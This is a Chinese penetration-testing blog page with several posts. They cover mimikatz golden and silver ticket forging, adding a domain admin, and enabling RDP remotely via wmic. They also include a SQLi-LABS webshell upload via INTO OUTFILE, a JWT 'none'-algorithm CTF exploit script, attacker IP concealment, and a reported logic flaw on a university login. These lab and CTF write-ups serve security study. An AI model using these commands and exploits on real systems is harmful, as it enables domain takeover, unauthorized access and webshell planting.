<p>注：如果以管理员权限打开的mimikatz，则需要用管理员权限打开CMD,不然会连接不上目标机器</p>
<p>是否真正写入内存需要打开cmd用以下命令验证，只有缓存是1才是真正写入</p>
<pre><code>klist</code></pre>
<p><img src="/images/201.png"></p>
<p>另外两种执行方法</p>
<p>①用cmd运行mimikatz</p>
<pre><code>mimikatz.exe &quot;privilege::debug&quot; &quot;kerberos::golden /user:Administrator /sid:S-1-5-21-3658974542-4157274802-4269447764 /krbtgt:129d836ceeac69cbb52340ef1bbdc6d3 /domain:edu.org /ptt&quot; &quot;exit&quot;</code></pre>
<p>②用mimikatz执行写入内存</p>
<pre><code>kerberos::golden /user:Administrator /sid:S-1-5-21-3658974542-4157274802-4269447764 /krbtgt:129d836ceeac69cbb52340ef1bbdc6d3 /domain:edu.org /ptt</code></pre>
<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a><strong>利用</strong></h5><h6 id="①创建超管用户，然后利用超管用户登录域内其他主机接管。"><a href="#①创建超管用户，然后利用超管用户登录域内其他主机接管。" class="headerlink" title="①创建超管用户，然后利用超管用户登录域内其他主机接管。"></a>①创建超管用户，然后利用超管用户登录域内其他主机接管。</h6><pre><code>net user chen qaz@123! /add /domain
net group &quot;domain admins&quot; chen /add /domain</code></pre>
<p>执行dir的时候连接DC,测试金票伪造是否成功只能使用<strong>主机名拼接域名</strong>，用IP去测试会失败。</p>
<p><img src="/images/202.png"></p>
<p><strong>执行命令打开域内其他目标机器3389端口</strong></p>
<pre><code>wmic /node:192.168.88.135 /user:edu.org\chen /password:qaz@123! process call create &#39;cmd.exe /c REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#39;</code></pre>
<p><img src="/images/204.png"></p>
<p>然后利用chen这个刚创建的超管用户进行远程登录机器接管</p>
<h6 id="②利用PsExec提权进行交互"><a href="#②利用PsExec提权进行交互" class="headerlink" title="②利用PsExec提权进行交互"></a><strong>②利用PsExec提权进行交互</strong></h6><p><img src="/images/203.png"></p>
<p><strong>用金票进行访问域内的其他主机复现失败(不知道为啥)</strong></p>
<p><img src="/images/205.png"></p>
<h4 id="白银票据伪造-Silver-Ticket"><a href="#白银票据伪造-Silver-Ticket" class="headerlink" title="白银票据伪造(Silver Ticket)"></a>白银票据伪造(Silver Ticket)</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><p>如果说黄金票据是伪造的TGT,那么白银票据就是伪造的ST。<br>在Kerberos认证的第三部，Client带着ST和Authenticator3向Server上的某个服务进行请求，Server接收到Client的请求之后,通过自己的Master Key 解密ST,从而获得 Session Key。通过 Session Key 解密 Authenticator3,进而验证对方的身份,验证成功就让 Client 访问server上的指定服务了。<br>所以我们只需要知道Server用户的Hash就可以伪造出一个ST,且不会经过KDC,但是伪造的门票只对部分服务起作用。</p>
<h5 id="伪造银票的所需条件"><a href="#伪造银票的所需条件" class="headerlink" title="伪造银票的所需条件"></a><strong>伪造银票的所需条件</strong></h5><pre><code>1、/domain: 指定域名
2、/sid: 客户端用户的sid号
3、/target: 需要访问的域服务器的计算机全名
4、/rc4: 目标服务器的NTLM Hash值 通常情况下，例如目标机器名为m1sn0w，那么这里需要指定的NTLM Hash值应该为m1sn0w$账号对应的NTLM Hash值
5、/service：需要伪造的服务，例如cifs访问文件服务
6、/user: 指定需要伪造的用户，一般使用Administrator</code></pre>
<p>服务类型可以从以下内容中来进行选择，因为我们没有TGT去不断申请ticket，所以只能针对某一些服务来进行伪造</p>
<p><img src="/images/206.png"></p>
<h5 id="所需要的信息获取"><a href="#所需要的信息获取" class="headerlink" title="所需要的信息获取"></a>所需要的信息获取</h5><p><strong>客户端用户的sid号</strong></p>
<p><code>sid</code>值：这里需要指定域内的<code>sid</code>值，我们可以通过<code>whoami /all</code>来进行查询</p>
<pre><code>whoami /all</code></pre>
<p><img src="/images/207.png"></p>
<p><strong>目标机器的<code>NTLM Hash</code>值</strong></p>
<p>目标机器的NTLM Hash值，而不是域内账号的NTLM Hash值。拿着域管的NTLM Hash去生成白银票据，发现是不能进行横向移动的。这里需要指定机器的NTLM Hash值，也就是说需要指定机器本地账户的NTLM Hash值。通常情况下，例如目标机器名为m1sn0w，那么这里需要指定的NTLM Hash值应该为m1sn0w$账号对应的NTLM Hash值。(如果hostname查出的机器名字是大写EAS3,则对应的hash的username也必须是大写EAS3，而不是小写eas3)</p>
<p><img src="/images/208.png"></p>
<h5 id="白银票据制作"><a href="#白银票据制作" class="headerlink" title="白银票据制作"></a>白银票据制作</h5><pre><code>kerberos::golden /domain:edu.org /sid:S-1-5-21-3485537082-426029256-2976247771 /target:EAS3.edu.org /rc4:fd6054cb66b99ee07c3ef0c0ae85b4f2 /service:cifs /user:Administrator /ptt</code></pre>
<p><img src="/images/209.png"></p>
<h5 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h5><h6 id="利用PsExec提权进行交互"><a href="#利用PsExec提权进行交互" class="headerlink" title="利用PsExec提权进行交互"></a>利用PsExec提权进行交互</h6><p><img src="/images/210.png"></p>
<h4 id="金票和银票的区别"><a href="#金票和银票的区别" class="headerlink" title="金票和银票的区别"></a>金票和银票的区别</h4><h5 id="获取的权限不同"><a href="#获取的权限不同" class="headerlink" title="获取的权限不同"></a>获取的权限不同</h5><p>金票：伪造的TGT，可以获取任意Kerberos的访问权限<br>银票：伪造的ST，只能访问指定的服务，如CIFS</p>
<h5 id="认证流程不同"><a href="#认证流程不同" class="headerlink" title="认证流程不同"></a>认证流程不同</h5><p>金票：同KDC交互，但不同AS交互<br>银票：不同KDC交互，直接访问Server</p>
<h5 id="加密方式不同"><a href="#加密方式不同" class="headerlink" title="加密方式不同"></a>加密方式不同</h5><p>金票：由krbtgt NTLM Hash 加密<br>银票：由服务账号 NTLM Hash 加密</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10439#toc-10">内网渗透初探(一) | 小白简单学习内网渗透 - 先知社区 (aliyun.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/23a4e8978a30">Kerberos认证 - 简书 (jianshu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/905605f1ad08">Kerberos认证步骤 - 简书 (jianshu.com)</a></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/12/04/SQLi-LABS%20%E7%AC%AC7%E5%85%B3/">
                Untitled
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-12-04</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <p>title: SQLi-LABS 第7关</p>
<p>data: 2020-12-3 19:25:30</p>
<p>tags:</p>
<h4 id="这一关是进行文件导入注入"><a href="#这一关是进行文件导入注入" class="headerlink" title="这一关是进行文件导入注入"></a>这一关是进行文件导入注入</h4><h4 id="①前提条件："><a href="#①前提条件：" class="headerlink" title="①前提条件："></a>①前提条件：</h4><ul>
<li>要有文件读写权限。</li>
</ul>
<pre><code>and (select count(*) from mysql.user)&gt;0</code></pre>
<p>如果返回正常，说名拥有权限。如果返回错误，则需要进行提权操作。</p>
<ul>
<li><p>必须拥有预读取文件的绝对路径。相对路径不行</p>
</li>
<li><p>欲读取文件要小于max_allowed_packet</p>
</li>
<li><p>预读取文件必须在服务器上</p>
</li>
</ul>
<h4 id="②函数介绍"><a href="#②函数介绍" class="headerlink" title="②函数介绍"></a>②函数介绍</h4><ul>
<li>into outfile() 写入文件（文件为不存在的文件）</li>
</ul>
<pre><code>select ....into outfile &quot;flie_name&quot;`</code></pre>
<pre><code>id=1&#39;)) union select 1,2,&quot;内容&quot; into outfile &quot;路径\\文件名&quot;</code></pre>
<p>虽然页面还是会报错，但进入文件夹会发现文件已经生成写入。</p>
<ul>
<li>Load_file(file_name)读取文件</li>
</ul>
<pre><code>id=1&#39;)) union select 1,2,load_life(路径文件)</code></pre>
<h4 id="③开始注入"><a href="#③开始注入" class="headerlink" title="③开始注入"></a>③开始注入</h4><ul>
<li>注入点判断</li>
</ul>
<p>这里我是用延时注入进行判断</p>
<pre><code>?id=1&#39;)) and sleep(3) --+</code></pre>
<p>正确会3秒后刷新页面。</p>
<ul>
<li>列数判断 </li>
</ul>
<p>order by 数字</p>
<ul>
<li>拥有权限，恶意文件写入</li>
</ul>
<pre><code>union select 1,&quot;     &quot;,3 into outflie &quot;           &quot; --+  路径使用双斜杆\\防止转义</code></pre>
<ul>
<li><img src="%5Cimages%5C5.png"></li>
<li>写入成功连接蚁剑</li>
<li>控制webshell行进文件删减等操作。</li>
</ul>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/12/02/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%A6%82%E4%BD%95%E9%9A%90%E8%97%8F%E8%87%AA%E5%B7%B1/">
                渗透测试之如何隐藏自己
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-12-02</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h5 id="渗透测试第一步如何更好的隐藏自己"><a href="#渗透测试第一步如何更好的隐藏自己" class="headerlink" title="渗透测试第一步如何更好的隐藏自己"></a>渗透测试第一步如何更好的隐藏自己</h5><p>在进行渗透测试的过程中往往会因为的自己的某个小失误而导致自己的真实IP外泄，这个失误却是致命的。</p>
<p><img src="/images/175.png"></p>
<p>那么该如何更好的隐藏自己呢？</p>
<h5 id="①网络配置"><a href="#①网络配置" class="headerlink" title="①网络配置"></a>①网络配置</h5><p>攻击机ubuntu20(网卡自定义：192.168.26.129)</p>
<p>代理机win10(网卡1NAT,网卡2自定义：192.168.26.130)</p>
<h5 id="②修改攻击机"><a href="#②修改攻击机" class="headerlink" title="②修改攻击机"></a>②修改攻击机</h5><p>先设置成NAT模式，安装需要的软件。</p>
<p>安装下proxychains代理</p>
<pre><code>apt install proxychains</code></pre>
<p>然后在把网络修改成自定义</p>
<p><img src="/images/176.png"></p>
<p><img src="/images/177.png"></p>
<p>检测下自己的ip是否不出网，且处于自定义网段。</p>
<pre><code>ping baidu.com 失败</code></pre>
<h5 id="③修改代理机"><a href="#③修改代理机" class="headerlink" title="③修改代理机"></a>③修改代理机</h5><p>先查看下ip</p>
<pre><code>ipconfig</code></pre>
<p>再攻击机和代理机互相ping下看是否能互相ping通，攻击机如果ping不通代理机就是防火墙的原因，执行以下命令关闭防火墙。再次尝试ping</p>
<pre><code>以管理员权限运行
netsh advfirewall set allprofiles state off</code></pre>
<p>也要可以ping通外网</p>
<pre><code>ping baidu.com</code></pre>
<p>然后在代理机上安装某代理工具，然后在其设置里设置成为允许来自局域网的连接。</p>
<h5 id="④修改攻击机"><a href="#④修改攻击机" class="headerlink" title="④修改攻击机"></a>④修改攻击机</h5><p>打开设置更改网络设置，修改socks代理为代理机上的代理端口，注意协议。现在大部分用的都是socks代理。</p>
<p><img src="/images/178.png"></p>
<p>当然这里设置完以后，只是浏览器的流量走的这里的代理端口，而终端的命令走的还不是这个代理端口。</p>
<p>修改/etc/proxychains.conf</p>
<p><img src="/images/179.png"></p>
<h5 id="⑤验证是否成功"><a href="#⑤验证是否成功" class="headerlink" title="⑤验证是否成功"></a>⑤验证是否成功</h5><p>攻击机</p>
<pre><code>curl http://google.com/ 失败</code></pre>
<pre><code>proxychains curl http://google.com/ 成功</code></pre>
<p>成功配置完成。因为攻击机的网卡模式是不出网的，如果自己的某个失误操作也不会让自己的真实IP外泄。因为它的流量只能走代理机的代理端口。</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/11/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">
                记一次逻辑漏洞挖掘
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-11-10</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <p>一般来说学校的教务系统都是集群站点，前台没有啥漏洞（大佬除外)。大部分只能靠github，google等地方获取学号等信息，进行爆破登录。这个时候，再逛某个大学的教务系统发现底下的技术支持好像见过，但是版本号好像低了点。猜想说不定有漏洞。</p>
<p>开始了测试之旅</p>
<p>先用github，googld搜集一波信息</p>
<p><img src="/images/149.png"></p>
<p>可以跟换语法，搜集一下学号规律，默认密码啥的。因为总有人没改默认密码。</p>
<p>先是看注册功能，可以注册成功，但需要管理员激活才可以登录。没啥用。</p>
<p>还有一个忘记密码功能，尝试任意密码修改。</p>
<p><img src="/images/150.png"></p>
<p>很常见的一个修改密码登录框，填完用户名，手机号随便填，验证码也随便填。拦截返回包</p>
<p><img src="/images/151.png"></p>
<p>直接把false改成true即可绕过验证。进入密码重置阶段，但是发现它是基于手机号识别用户的，如果填入的手机号是存在的，在下一步会自动出现对应匹配的用户名。如果没有就会是空的。不过不要紧，这都是基于前端的显示，填好密码。发送数据包，把用户名改成我们之前填入那个。发包，重置成功。</p>
<p>当然了，必须要登录验证一下是否真的成功，因为有些只是前端显示重置成功，而后端数据库并没有修改。经过验证，成功登录该学号的教务系统。</p>
<p>接下来就是必测的功能点，登录框了。</p>
<p>先用刚才重置过的账号密码，正常登录一遍，观察一遍请求包和响应包。</p>
<p>发现响应包回来竟然没带cookie，而且有响应状态码和对应的用户名，猜测也是用前端验证。</p>
<p><img src="/images/152.png"></p>
<p>对着返回的状态码去翻一遍所有的js代码文件，发现在user.js文件里出现的该响应包，对应的信息都可以对上。接下来就看返回多少状态码是登录成功的了。成功发现，测试一下。</p>
<p>拦截数据包修改code发包，发现登录成功。</p>
<p>尝试登录admin账号，成功登录。</p>
<p><img src="/images/153.png"></p>
<p>刚才提到系统底下有技术支持，所以有fofa对着搜了一下，发现有十几家。测了另外一个站，也成功了。</p>
<p>渗透测试点到为止，后面就没继续测了。该漏洞已经上报。</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/10/04/jwt%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F/">
                jwt的绕过方式
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-10-04</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h5 id="0x01什么是JWT"><a href="#0x01什么是JWT" class="headerlink" title="0x01什么是JWT"></a>0x01什么是JWT</h5><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cjsblog/p/9277677.html">以下内容摘自此文章</a></p>
<ul>
<li>JSON Web Token的结构</li>
</ul>
<p><img src="/images/211.png"></p>
<p>JSON Web Token由三部分组成，它们之间用圆点(.)连接。这三部分分别是：</p>
<ul>
<li>Header</li>
<li>Payload</li>
<li>Signature</li>
</ul>
<p>因此，一个典型的JWT看起来是这个样子的：</p>
<p>xxxxx.yyyyy.zzzzz</p>
<ul>
<li>Header</li>
</ul>
<p>header典型的由两部分组成：token的类型（“JWT”）和算法名称（比如：HMAC SHA256或者RSA等等）。</p>
<p>例如：</p>
<p><img src="/images/212" alt="img"></p>
<p>然后，用Base64对这个JSON编码就得到JWT的第一部分</p>
<ul>
<li>Payload</li>
</ul>
<p>JWT的第二部分是payload，它包含声明（要求）。声明是关于实体(通常是用户)和其他数据的声明。声明有三种类型: registered, public 和 private。</p>
<ul>
<li>Registered claims : 这里有一组预定义的声明，它们不是强制的，但是推荐。比如：iss (issuer), exp (expiration time), sub (subject), aud (audience)等。</li>
<li>Public claims : 可以随意定义。</li>
<li>Private claims : 用于在同意使用它们的各方之间共享信息，并且不是注册的或公开的声明。</li>
</ul>
<p>下面是一个例子：</p>
<p><img src="/images/213.png"></p>
<p>对payload进行Base64编码就得到JWT的第二部分</p>
<p>注意，不要在JWT的payload或header中放置敏感信息，除非它们是加密的。</p>
<ul>
<li>Signature</li>
</ul>
<p>为了得到签名部分，你必须有编码过的header、编码过的payload、一个秘钥，签名算法是header中指定的那个，然对它们签名即可。</p>
<p>例如：</p>
<p>HMACSHA256(base64UrlEncode(header) + “.” + base64UrlEncode(payload), secret)</p>
<p>签名是用于验证消息在传递过程中有没有被更改，并且，对于使用私钥签名的token，它还可以验证JWT的发送方是否为它所称的发送方。</p>
<ul>
<li>JWT解密网站</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a></p>
<p>看一张官网的图</p>
<p><img src="/images/214.png"></p>
<ul>
<li> JSON Web Tokens是如何工作的</li>
</ul>
<p>在认证的时候，当用户用他们的凭证成功登录以后，一个JSON Web Token将会被返回。此后，token就是用户凭证了，你必须非常小心以防止出现安全问题。一般而言，你保存令牌的时候不应该超过你所需要它的时间。</p>
<h5 id="0x02如何绕过JWT验证"><a href="#0x02如何绕过JWT验证" class="headerlink" title="0x02如何绕过JWT验证"></a>0x02如何绕过JWT验证</h5><ul>
<li><p>当然如果网站泄露了加密的密钥+获取到一个密文。就可以利用jwt.io网站进行任意身份是伪造</p>
</li>
<li><p>利用c-jwt-cracker工具进行密钥的爆破</p>
<p><a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">工具地址</a></p>
</li>
<li><p>修改算法从RS256到HS256</p>
</li>
<li><p>利用网站的缺陷（将加密算法改成None）。例：nodejs的jwt缺陷，当jwt的secret为空，jwt会采用algorithm为none进行解密。</p>
</li>
</ul>
<p>题目：[HFCTF2020]EasyLogin</p>
<p>题目功能很简单</p>
<ul>
<li>注册</li>
<li>登录</li>
<li>GETFLAG</li>
</ul>
<p>首先注册个普通用户，登录进去。点击GETFLAG。提示无权限，猜测需要admin才能获取。</p>
<p>查看网站加载的js文件，发现app.js</p>
<pre><code>/**
 *  或许该用 koa-static 来处理静态文件
 *  路径该怎么配置？不管了先填个根目录XD
 */

 function login() &#123;
    const username = $(&quot;#username&quot;).val();
    const password = $(&quot;#password&quot;).val();
    const token = sessionStorage.getItem(&quot;token&quot;);
    $.post(&quot;/api/login&quot;, &#123;username, password, authorization:token&#125;)
        .done(function(data) &#123;
            const &#123;status&#125; = data;
            if(status) &#123;
                document.location = &quot;/home&quot;;
            &#125;
        &#125;)
        .fail(function(xhr, textStatus, errorThrown) &#123;
            alert(xhr.responseJSON.message);
        &#125;);
&#125;

function register() &#123;
    const username = $(&quot;#username&quot;).val();
    const password = $(&quot;#password&quot;).val();
    $.post(&quot;/api/register&quot;, &#123;username, password&#125;)
        .done(function(data) &#123;
            const &#123; token &#125; = data;
            sessionStorage.setItem(&#39;token&#39;, token);
            document.location = &quot;/login&quot;;
        &#125;)
        .fail(function(xhr, textStatus, errorThrown) &#123;
            alert(xhr.responseJSON.message);
        &#125;);
&#125;

function logout() &#123;
    $.get(&#39;/api/logout&#39;).done(function(data) &#123;
        const &#123;status&#125; = data;
        if(status) &#123;
            document.location = &#39;/login&#39;;
        &#125;
    &#125;);
&#125;

function getflag() &#123;
    $.get(&#39;/api/flag&#39;).done(function(data) &#123;
        const &#123;flag&#125; = data;
        $(&quot;#username&quot;).val(flag);
    &#125;).fail(function(xhr, textStatus, errorThrown) &#123;
        alert(xhr.responseJSON.message);
    &#125;);
&#125;</code></pre>
<p>这里就要看自己的经验了，发现是koa框架</p>
<p>框架的目录结构</p>
<p><img src="/images/215.png"></p>
<p>访问/controllers/api.js得到主要逻辑代码</p>
<pre><code>const crypto = require(&#39;crypto&#39;);
const fs = require(&#39;fs&#39;)
const jwt = require(&#39;jsonwebtoken&#39;)

const APIError = require(&#39;../rest&#39;).APIError;

module.exports = &#123;
    &#39;POST /api/register&#39;: async (ctx, next) =&gt; &#123;
        const &#123;username, password&#125; = ctx.request.body;

        if(!username || username === &#39;admin&#39;)&#123;
            throw new APIError(&#39;register error&#39;, &#39;wrong username&#39;);
        &#125;

        if(global.secrets.length &gt; 100000) &#123;
            global.secrets = [];
        &#125;

        const secret = crypto.randomBytes(18).toString(&#39;hex&#39;);
        const secretid = global.secrets.length;
        global.secrets.push(secret)

        const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#39;HS256&#39;&#125;);

        ctx.rest(&#123;
            token: token
        &#125;);

        await next();
    &#125;,

    &#39;POST /api/login&#39;: async (ctx, next) =&gt; &#123;
        const &#123;username, password&#125; = ctx.request.body;

        if(!username || !password) &#123;
            throw new APIError(&#39;login error&#39;, &#39;username or password is necessary&#39;);
        &#125;

        const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;

        const sid = JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;

        console.log(sid)

        if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123;
            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);
        &#125;

        const secret = global.secrets[sid];

        const user = jwt.verify(token, secret, &#123;algorithm: &#39;HS256&#39;&#125;);

        const status = username === user.username &amp;&amp; password === user.password;

        if(status) &#123;
            ctx.session.username = username;
        &#125;

        ctx.rest(&#123;
            status
        &#125;);

        await next();
    &#125;,

    &#39;GET /api/flag&#39;: async (ctx, next) =&gt; &#123;
        if(ctx.session.username !== &#39;admin&#39;)&#123;
            throw new APIError(&#39;permission error&#39;, &#39;permission denied&#39;);
        &#125;

        const flag = fs.readFileSync(&#39;/flag&#39;).toString();
        ctx.rest(&#123;
            flag
        &#125;);

        await next();
    &#125;,

    &#39;GET /api/logout&#39;: async (ctx, next) =&gt; &#123;
        ctx.session.username = null;
        ctx.rest(&#123;
            status: true
        &#125;)
        await next();
    &#125;
&#125;;</code></pre>
<p>可以看到注册名不能是admin，然后如果登录为admin就可以获取到flag。</p>
<ul>
<li>利用</li>
</ul>
<p>js是弱语言类型，我们可以将secretid设置为一个小数或空数组（空数组与数字比较时为0）来绕过secretid的一个验证（不能为null&amp;undefined）</p>
<p>exp</p>
<pre><code>import jwt
token = jwt.encode(&#123;&quot;secretid&quot;:[],&quot;username&quot;: &quot;admin&quot;,&quot;password&quot;: &quot;123456&quot;,&quot;iat&quot;: 1596626836&#125;,algorithm=&quot;none&quot;,key=&quot;&quot;)
print(token)
#eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMzQ1NiIsImlhdCI6MTU5NjYyNjgzNn0.</code></pre>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2021/09/15/struts2%E7%B3%BB%E5%88%97%E5%A4%8D%E7%8E%B0/">
                struts2系列复现
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-09-15</span>
            
            
            
        </div>
    </div>

    
        <div class="content">
            <h5 id="如何判断是否是struts2框架"><a href="#如何判断是否是struts2框架" class="headerlink" title="如何判断是否是struts2框架"></a>如何判断是否是struts2框架</h5><p>①网页后缀 login.do ，login.action</p>
<p>②页面报错看是否存在strust字样等</p>
<p>③判断 /struts/webconsole.html 是否存在来进行判断，需要 devMode 为 true</p>
<p>其它的方法：通过 actionErrors。要求是对应的 Action 需要继承自 ActionSupport 类。 </p>
<p>利用方法：</p>
<p>如原始 URL 为 <a target="_blank" rel="noopener" href="https://threathunter.org/">https://threathunter.org</a></p>
<p>则检测所用的 URL 为 <a target="_blank" rel="noopener" href="https://threathunter.org/?actionErrors=1111">https://threathunter.org/?actionErrors=1111</a> </p>
<p>如果返回的页面出现异常，则可以认定为目标是基于 Struts2 构建的。</p>
<p>异常包括但不限于以下几种现象： </p>
<p>1、 页面直接出现 404 或者 500 等错误。 </p>
<p>2、 页面上输出了与业务有关错误消息，或者 1111 被回显到了页面上。</p>
<p>3、 页面的内容结构发生了明显的改变。 </p>
<p>4、 页面发生了重定向。</p>

        </div>
    

</div>
            
        </section>
    </div>
</div>



    <div class="row">
        <div class="col-sm-12">
            <div class="wrap-pagination">
                <a class="disabled" href="/">
                    <i class="fa fa-chevron-left" aria-hidden="true"></i>
                </a>
                <a class="" href="/page/2/">
                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
                </a>
            </div>
        </div>
    </div>




</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    This theme was developed by <a target="_blank" rel="noopener" href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2022/03/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-NTLM-Relay%E6%94%BB%E5%87%BB/">内网渗透篇-NTLM Relay攻击</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/03/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E9%9D%9E%E7%BA%A6%E6%9D%9F-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">内网渗透篇-非约束/约束委派攻击</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/02/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/">内网渗透篇-隧道代理</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/02/20/Thinkphp6-0-12LTS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Thinkphp6.0.12LTS反序列化漏洞分析</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://github.com/klugjo/hexo-theme-alpha-dust">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://twitter.com/?lang=en">
                            <span class="footer-icon-container">
                                <i class="fa fa-twitter"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.facebook.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-facebook"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.instagram.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-instagram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://dribbble.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-dribbble"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://telegram.org/">
                            <span class="footer-icon-container">
                                <i class="fa fa-telegram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.behance.net/">
                            <span class="footer-icon-container">
                                <i class="fa fa-behance"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://500px.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-500px"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:test@example.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="\#">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @Untitled. All right reserved | Design & Hexo <a target="_blank" rel="noopener" href="http://www.codeblocq.com/">Jonathan Klughertz</a>
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->

<script src="/js/main.js"></script>


<!-- Disqus Comments -->



</body>

</html>